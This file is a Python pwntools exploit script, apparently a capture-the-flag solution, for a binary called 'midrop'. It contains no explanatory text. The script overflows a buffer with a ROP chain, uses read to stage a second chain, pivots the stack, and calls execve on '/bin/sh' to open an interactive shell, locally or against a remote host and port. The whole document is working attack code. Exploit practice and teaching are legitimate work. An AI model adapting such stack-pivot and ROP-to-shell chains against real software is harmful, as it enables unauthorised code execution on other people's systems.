from pwn import *
import base64

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
b* 0x400c19
b* 0x400cd0
b* 0x400c6f
b* 0x400d43
continue
'''.format(**locals())

#Binary filename
exe = './midrop'
elf = context.binary = ELF(exe, checksec=False)
#context.log_level = 'debug'

################################################################

p = start()

p.recvuntil("name >\n")

pop_rax = 0x41f8d4
pop_rdi = 0x4019a6
pop_rsi = 0x401ac7
pop_rdx = 0x442d66
pop_rsp = 0x40060b
syscall = 0x4003da
read = 0x43f8f0

ROP  = p64(pop_rdi) + p64(0)
ROP += p64(pop_rsi) + p64(0x6ccb00)
ROP += p64(pop_rdx) + p64(0x200)
ROP += p64(read)
ROP += p64(pop_rsp) + p64(0x6ccb20)
ROP  = p64(0x4002e1) * int((0xf8 - len(ROP)) / 8) + ROP

p.sendline(ROP)

p.recvuntil(b"< Input your content encoded by base64 >\n")
payload = base64.b64encode(b"a"*0x300)
p.send(payload)

p.recvuntil("a"*0x300 + "\n")

ROP2 = b"/bin/sh".ljust(0x20, b'\x00')
ROP2 += p64(pop_rax) + p64(59)
ROP2 += p64(pop_rdi) + p64(0x6ccb00)
ROP2 += p64(pop_rsi) + p64(0)
ROP2 += p64(pop_rdx) + p64(0)
ROP2 += p64(syscall)

p.sendlineafter("Go on? (y/n) >\n", "n")
p.send(ROP2)

p.interactive()